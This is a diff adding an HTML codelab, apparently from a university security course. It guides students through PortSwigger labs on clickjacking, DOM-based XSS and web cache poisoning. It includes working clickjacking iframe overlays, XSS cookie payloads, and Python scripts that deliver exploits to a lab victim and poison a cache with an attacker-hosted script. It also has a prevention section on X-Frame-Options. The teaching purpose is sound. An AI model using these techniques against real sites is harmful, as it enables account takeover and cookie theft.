@@ -1,0 +1,284 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>5.2: Clickjacking, Web Cache Poisoning</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W5.2_clickjacking_webcache" title="5.2: Clickjacking, Web Cache Poisoning" environment="web" feedback-link="https://docs.google.com/document/d/1z15wws-cTrL_H3JTZdYpACK-s4tij-pfO7tKJyH6Y3w">
+<google-codelab-step label="clickjacking (1)" duration="5">
+<aside class="special"><p>Note: The victim account on these levels is using the Chrome browser. Ensure that you use Chrome to craft the exploits.</p>
+</aside>
+<p>Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. Clickjacking is similar to CSRF in that the victim must visit a malicious site that has the embedded URL of the vulnerable site which triggers the exploit. Unlike CSRF, the victim must click on the exploit link in order to trigger it. This is done via CSS that overlays visual content on top of the legitimate site&#39;s content. The legitimate site is loaded as an &lt;<code>iframe</code>&gt; within the malicious site. Then, to trick the victim, the &lt;<code>iframe</code>&gt; is made transparent by configuring its opacity to be nearly transparent within CSS. Thus, although the content is there, the victim can not see it. Note that since the malicious site is actually retrieving the content from the vulnerable site, the CSRF token mechanism can not prevent this attack.</p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected" target="_blank">basic-csrf-protected</a></h2>
+<h3 is-upgraded>Identify clickjacking target</h3>
+<p>To demonstrate this attack, visit the lab site. As before, you are given the credentials of a user on the site (<code>wiener / peter</code>). Log in as this user, then navigate the menus to bring up the &#34;My account&#34; page that contains a button that deletes the user&#39;s account. Copy the URL for this page. This is the URL we will be loading up in an &lt;<code>iframe</code>&gt; on the exploit site.<br></p>
+<p class="image-container"><img style="width:546px" src="img/c747b9e75836883a.png"></p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Construct transparent &lt;<code>iframe</code>&gt;</h3>
+<p>Now, visit the exploit server. We are given the ability to craft a page that overlays a UI element on top of this page above. By making the element enticing (e.g. via text that says &#34;Click me&#34;), we can trick the victim to click through to the &lt;<code>iframe</code>&gt; and cause the victim to initiate an account deletion. We will now construct the exploit. Consider the CSS below:</p>
+<pre><code>&lt;style&gt;
+   iframe {
+       position: relative;
+       width: 700px;
+       height: 700px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   div {
+       position: absolute;
+       top: 300px;
+       left: 60px;
+       z-index: 1;
+   }
+&lt;/style&gt;</code></pre>
+<p>It constructs a style for the &lt;<code>iframe</code>&gt; with particular dimensions and a low opacity. This will load the vulnerable page up so we can faintly see it in the background. In a real attack, the opacity would be set to something much smaller to make the vulnerable page completely invisible to the victim. It then constructs a style for the &lt;<code>div</code>&gt; that places the element in a particular location in order to cause the content of the &lt;<code>div</code>&gt; to fall right on top of the &#34;Delete account&#34; element of the underlying &lt;<code>iframe</code>&gt; from the vulnerable site. The CSS is followed by the HTML which instantiates the content. Fill it in based on the URL of the page that contains the &#34;Delete account&#34; button. The HTML instantiates the text &#34;Click me&#34; that will appear right over the &#34;Delete account&#34; of the &lt;<code>iframe</code>&gt;. Go to the exploit server for the lab and paste in your exploit after filling in the URL in the &lt;<code>iframe</code>&gt;.</p>
+<aside class="special"><p>&lt;<code>FMI</code>&gt; (Fill Me In) denotes a value you will need to modify.</p>
+</aside>
+<pre><code>&lt;div&gt;Click me&lt;/div&gt;
+&lt;iframe src=&#34;https://{site}/&lt;FMI&gt;&#34;&gt;&lt;/iframe&gt;</code></pre>
+<p><img style="width:591px" src="img/2174847bd67f89e3.png"><br><br>Since the opacity is set to a low value, when you &#34;Store&#34; the exploit and then &#34;View exploit&#34;, you should get something that looks like below with the &#34;Click me&#34; text clearly seen and the underlying &lt;<code>iframe</code>&gt; barely visible.</p>
+<p class="image-container"><img style="width:624px" src="img/94e4cbc22ae3e450.png"></p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Deliver exploit</h3>
+<p>While we can now go back to the exploit server and &#34;Deliver exploit to victim&#34; to complete the level, we can also do so via Python by performing a &#34;<code>DELIVER_TO_VICTIM</code>&#34; <code>formAction</code> using the exploit HTML (filling in the <code>width</code> and <code>height</code> attributes of the &lt;<code>iframe</code>&gt; with your calculated ones). Note that within the Python script, the double curly braces is used in an f-string in order to specify a literal curly brace that is not interpreted as a format string parameter.</p>
+<pre><code>s = requests.Session()
+site_url = f&#39;https://{site}/&#39;
+resp = s.get(site_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+exploit_url = soup.find(&#39;a&#39;, {&#39;id&#39;:&#39;exploit-link&#39;}).get(&#39;href&#39;)
+
+exploit_html = f&#39;&#39;&#39;&lt;style&gt;
+   iframe &#123;&#123;
+       position:relative;
+       width: &lt;FMI&gt;px;
+       height: &lt;FMI&gt;px;
+       opacity: 0.3;
+       z-index: 2;
+   }}
+   div &#123;&#123;
+       position:absolute;
+       top:530px;
+       left:60px;
+       z-index: 1;
+   }}
+&lt;/style&gt;
+&lt;div&gt;Click me&lt;/div&gt;
+&lt;iframe src=&#34;https://{site}/&lt;FMI&gt;&#34;&gt;&lt;/iframe&gt;
+&#39;&#39;&#39;
+
+formData = {
+    &#39;urlIsHttps&#39;: &#39;on&#39;,
+    &#39;responseFile&#39;: &#39;/exploit&#39;,
+    &#39;responseHead&#39;: &#39;HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8&#39;,
+    &#39;responseBody&#39;: exploit_html,
+    &#39;formAction&#39;: &#39;DELIVER_TO_VICTIM&#39;
+}
+
+resp = s.post(exploit_url, data=formData)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="clickjacking (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input" target="_blank">prefilled-form-input</a> </h2>
+<p>One of the targets for a clickjacking attack is a user&#39;s identity and account information. For example, changing an account&#39;s e-mail address can allow an attacker to hijack a victim&#39;s account.</p>
+<p>Begin by logging in with the given credentials on the lab site. Then, visit the &#34;My account&#34; page to view its e-mail change form. Then, using the prior level&#39;s exploit script, change its <code>formAction</code> to &#34;<code>STORE</code>&#34; and upload the prior level&#39;s solution to the exploit server. Then visit the exploit server and &#34;View exploit&#34;. Note that the transparent &lt;<code>iframe</code>&gt; contains the form, but doesn&#39;t have an address filled in. Even if we properly aligned the &#34;Click me&#34; and &#34;Update email&#34; buttons, nothing would happen when the victim clicks.</p>
+<p><img style="width:624px" src="img/3629f2f46eab319b.png">Form values can be optionally prefilled if given the appropriate parameters either within the form itself or via URL parameters. Inspect the form in Developer Tools to view the form:</p>
+<ul>
+<li><strong>In the form&#39;s HTML, how many fields are present? Which one has been prefilled with a </strong><strong><code>value</code></strong><strong>?</strong></li>
+</ul>
+<p>Examine the URL of the page. As the URL shows, a URL parameter named <code>id</code> is given with a value set to the account&#39;s username. Change the <code>id</code> parameter in the URL to the <code>email</code> parameter in the form and set its value to your e-mail address. You should see that the form has been prefilled with your e-mail address.</p>
+<p>Go back to your exploit and change the URL of its &lt;<code>iframe</code>&gt; to be the URL that prefills the form with your email address. Store the exploit then visit the exploit server and &#34;View exploit&#34;</p>
+<ul>
+<li><strong>Take a screenshot showing that the form in the transparent &lt;</strong><strong><code>iframe</code></strong><strong>&gt; has been prefilled similar to below</strong></li>
+</ul>
+<p class="image-container"><img style="width:624px" src="img/e9e4777de65c26ca.png"></p>
+<p>Finally, modify the pixel offsets for the &#34;Click me&#34; button in your exploit to align it with the &#34;Update email&#34; button, then deliver the exploit to the victim to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="clickjacking (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss" target="_blank">trigger-dom-based-xss</a> </h2>
+<h3 is-upgraded>Identify XSS vulnerability</h3>
+<p>Access the site and visit the &#34;Submit feedback&#34; page. Fill in the form with your name, e-mail address and a subject and message of your choice. As the results show, the name field of the form is used to update the DOM with a message of thanks. Right-click the message and Inspect it in Developer Tools.</p>
+<ul>
+<li><strong>What is the name of the HTML element that has been updated after the form has been submitted?</strong></li>
+</ul>
+<p>Below the form, a Javascript file has been included that handles the feedback submission function. Bring this file up in the Sources tab of Developer Tools and examine its source code. The first part of the script registers an event listener for when the button to submit the form has been pressed. The listener invokes the <code>submitFeedback()</code> function that follows it.</p>
+<p class="image-container"><img style="width:624px" src="img/45b67192bcca05c7.png"></p>
+<p>Examine the <code>submitFeedback()</code> function.</p>
+<ul>
+<li><strong>What is the name of the function that is registered as an event listener for when the page is loaded?</strong></li>
+</ul>
+<p>Examine the function that is executed when a page has been loaded. The function gets a reference to the HTML element obtained earlier and modifies its content.</p>
+<ul>
+<li><strong>Show the vulnerable line of code in this function and explain why it is subject to an XSS attack.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Demonstrate XSS vulnerability</h3>
+<p>Go back to the feedback form and exploit the XSS vulnerability by injecting an HTML heading (e.g. &lt;<code>h1</code>&gt;) containing your OdinId into the page as shown below:</p>
+<p class="image-container"><img style="width:624px" src="img/6be947639086ca20.png"></p>
+<p>As with the prior level, the form itself can be prefilled with values that are passed to it via URL parameters. To demonstrate this, fill in the parameters within the feedback URL with your HTML header injection and e-mail address. Then, bring it up in a web browser to see the form pre-filled. Submit the form to ensure you obtain the results above.</p>
+<pre>feedback?name=&lt;FMI&gt;&amp;email=&lt;FMI&gt;@pdx.edu&amp;subject=foo&amp;message=bar</pre>
+<p>As in the prior level, if this page were brought up in a transparent &lt;<code>iframe</code>&gt; and an enticing button were overlaid on top of the &#34;Submit feedback&#34; button, a victim tricked into clicking the button would submit the form.</p>
+<ul>
+<li><strong>Take a screenshot that includes the URL demonstrating successful injection</strong></li>
+</ul>
+<h3 is-upgraded>Attempt script injection</h3>
+<p>While perhaps fun, injecting an HTML element is not particularly useful. Adversaries will instead leverage such vulnerabilities to inject and execute Javascript code. Repeat the exploit above using the payload below:</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<p>Inspect the resulting page and answer the questions below:</p>
+<ul>
+<li><strong>Did the payload get successfully returned into the page?</strong></li>
+<li><strong>Did the payload execute? If not, what might be the reason?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Cookie exfiltration</h3>
+<p>Another way of getting Javascript to execute is to include it in event attributes of an HTML tag. As shown in prior XSS levels, the &lt;<code>img</code>&gt; tag below attempts to load a bogus image and then registers Javascript code to execute onerror that will pop up a window that includes the client&#39;s cookie for the site.</p>
+<pre><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></pre>
+<p>Using this payload, craft a feedback URL that pre-fills the feedback form&#39;s fields with this exploit. Ensure that, when the &#34;Submit feedback&#34; link is clicked, you obtain the pop-up.</p>
+<h3 is-upgraded>Develop and deliver exploit</h3>
+<p>Using the URL you have developed, include it as the &lt;<code>iframe</code>&gt; URL within the <code>exploit_html</code> below. Then, using the prior scripts, <code>STORE</code> it on the exploit site.</p>
+<pre><code>exploit_html = f&#39;&#39;&#39;&lt;style&gt;
+   iframe &#123;&#123;
+       position: relative;
+       width: 700px;
+       height: 1000px;
+       opacity: 0.3;
+       z-index: 2;
+   }}
+   div &#123;&#123;
+       position: absolute;
+       top: 100px;
+       left: 100px;
+       z-index: 1;
+   }}
+&lt;/style&gt;
+&lt;div&gt;Click me&lt;/div&gt;
+&lt;iframe src=&#34;&lt;FMI&gt;&#34;&gt;&lt;/iframe&gt;
+&#39;&#39;&#39;</code></pre>
+<p>Go to the exploit server and &#34;View exploit&#34;</p>
+<ul>
+<li><strong>Take a screenshot showing the location of the &#34;Click me&#34; element on the underlying feedback page.</strong></li>
+</ul>
+<p>Finally, modify the pixel locations of the &#34;Click me&#34; element to land on top of the &#34;Submit feedback&#34; button and then <code>DELIVER_TO_VICTIM</code>, in order to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Prevention (X-Frame-Options)" duration="5">
+<p>For the exercises below, show screenshots of the errors</p>
+<h2 is-upgraded>Google</h2>
+<ul>
+<li>From the command line, use <code>nc -C</code> to connect to <code>google.com</code> and download its landing page. </li>
+<li>This can be done interactively or by echoing the results of a GET request to the webpage (<code>echo -en "GET / HTTP/1.0\n\n\n" | nc -C </code><a href="http://www.google.com" target="_blank"><code>www.google.com</code></a><code> 80)</code></li>
+<li>Inspect the HTTP response headers you receive on the reply.</li>
+<li><strong>Show a screenshot of what Google passes back with in its </strong><strong><code>X-Frame-Options:</code></strong><strong> header.</strong></li>
+<li>Create a local HTML file with an &lt;<code>iframe</code>&gt; that attempts to place Google&#39;s homepage into itself.</li>
+</ul>
+<pre>&lt;html&gt;&lt;body&gt;&lt;iframe src=&#34;https://www.google.com&#34; width=&#34;800&#34; height=&#34;800&#34;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;</pre>
+<ul>
+<li>Open up a browser and the Developer Tools console</li>
+<li>Load the file in a browser and see if the page loads. </li>
+<li><strong>If not, show the error in the console and explain the results.</strong></li>
+</ul>
+<h2 is-upgraded>OregonCTF</h2>
+<ul>
+<li>Use <code>nc -C</code> to connect to <code>oregonctf.org</code> and download its landing page. </li>
+<li>Inspect the HTTP response headers you receive on the reply.</li>
+<li><strong>Show a screenshot of what OregonCTF passes back. Is there a </strong><strong><code>X-Frame-Options:</code></strong><strong> header?</strong></li>
+<li>Create a local HTML file with an &lt;<code>iframe</code>&gt; that attempts to place OregonCTF&#39;s homepage into itself.</li>
+</ul>
+<pre>&lt;html&gt;&lt;body&gt;&lt;iframe src=&#34;https://oregonctf.org&#34; width=&#34;800&#34; height=&#34;800&#34;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;</pre>
+<ul>
+<li>Open up a browser and the Developer Tools console</li>
+<li>Load the file in a browser and see if the page loads. </li>
+<li><strong>If not, show the error in the console and explain the results.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="web-cache-poisoning/exploiting" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-header" target="_blank">web-cache-poisoning-with-an-unkeyed-header </a></h2>
+<h3 is-upgraded>Caching behavior</h3>
+<p>Bring up Developer Tools and access the main landing page. Inspect the page, bring up the &#34;Network&#34; tab, and then click on &#34;Reload&#34;. The initial landing page is cacheable and the HTTP response headers that are returned indicate the age of the page, the maximum age of the page, and whether or not the request hit or missed in the cache.</p>
+<ul>
+<li><strong>Take a screenshot of the three response headers and their values that indicate this</strong></li>
+</ul>
+<p>When the age of the page reaches the maximum age, a subsequent reload on the main landing page will result in a cache miss, resetting the age of the cached page to 0. Wait until the page expires and reload the page until you obtain a cache miss.</p>
+<ul>
+<li><strong>Take a screenshot of the three response headers indicating the miss</strong></li>
+</ul>
+<h3 is-upgraded>Content poisoning</h3>
+<p>Click on the &#34;Elements&#34; tab in the Developer Tools and find the &lt;<code>script</code>&gt; tag for a tracking script that immediately follows the initial &lt;<code>body</code>&gt; tag. Note that it includes the web site&#39;s name in its URL.</p>
+<p class="image-container"><img style="width:522px" src="img/1008ec26b045eb78.png"></p>
+<p>The <code>X-Forwarded-Host:</code> header denotes the original destination the user is attempting to access. However, the user can lie about this and inject a bogus hostname. If this hostname is included in the response, such as the URL of the tracking script, an adversary can poison it for subsequent users. A Python script can set the <code>X-Forwarded-Host:</code> header to a bogus value, and if that value appears back in the response, the response will be cached for other uses, effectively poisoning the landing page. Fill in the header value in the script with your OdinId (e.g. in my case <code>wuchang.net</code>) and run the script until you get a cache miss and then print out the script tag to indicate the page has been poisoned.</p>
+<pre><code>s = requests.Session()
+site_url = f&#39;https://{site}&#39;
+headers = {
+   &#39;X-Forwarded-Host&#39; : f&#39;{OdinId}.net&#39;
+}
+resp = s.get(site_url, headers=headers)
+if resp.headers[&#39;X-Cache&#39;] == &#39;miss&#39;:
+    soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+    script_src = soup.find(&#39;script&#39;)
+    print(f&#39;Poisoned script tag is {script_src}&#39;)</code></pre>
+<p>Quickly reload the page in a web browser and view its HTML. See that the poisoned page has been cached and returned.</p>
+<ul>
+<li><strong>Take a screenshot of the poisoned link for your lab notebook as shown below.</strong></li>
+</ul>
+<p class="image-container"><img style="width:524px" src="img/d1066d65eb673d68.png"></p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Develop and deliver exploit</h3>
+<p>We can now perform the exploit. As before, we&#39;re given an exploit site to host our malicious tracking script. We&#39;ll place the code &#39;<code>alert(document.cookie)</code>&#39; at <code>https://{exploit_site}/resources/js/tracking.js</code>.</p>
+<pre><code>resp = s.get(site_url)
+exploit_url = soup.find(&#39;a&#39;, {&#39;id&#39;:&#39;exploit-link&#39;}).get(&#39;href&#39;)
+exploit_site = urllib3.util.parse_url(exploit_url).host 
+exploit_html = &#39;alert(document.cookie)&#39;
+
+formData = {
+   &#39;urlIsHttps&#39;: &#39;on&#39;,
+   &#39;responseFile&#39;: &#39;/resources/js/tracking.js&#39;,
+   &#39;responseHead&#39;: &#39;HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8&#39;,
+   &#39;responseBody&#39;: exploit_html,
+   &#39;formAction&#39;: &#39;STORE&#39;
+}
+resp = s.post(exploit_url, data=formData)</code></pre>
+<p>Then, when accessing the main landing page, we can set the <code>X-Forwarded-Host:</code> header to point to the <code>exploit_site</code> to poison the cached landing page. Because we must time our poisoning attempt to occur right when the current cached copy expires, we can perform an initial request, examine its age, then wait until it expires to poison the cache. Adapt the code below to solve the level.</p>
+<pre><code>headers = {
+   &#39;X-Forwarded-Host&#39; : exploit_site
+}
+while True:
+ resp = s.get(site_url, headers=headers)
+ if resp.headers[&#39;X-Cache&#39;] == &#39;miss&#39;:
+       print(f&#39;Poisoned (miss): {resp.headers}&#39;)
+       break
+ timeleft = 30 - int(resp.headers[&#39;Age&#39;])
+ print(f&#39;Waiting {timeleft} to expire cache&#39;)
+ time.sleep(timeleft)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
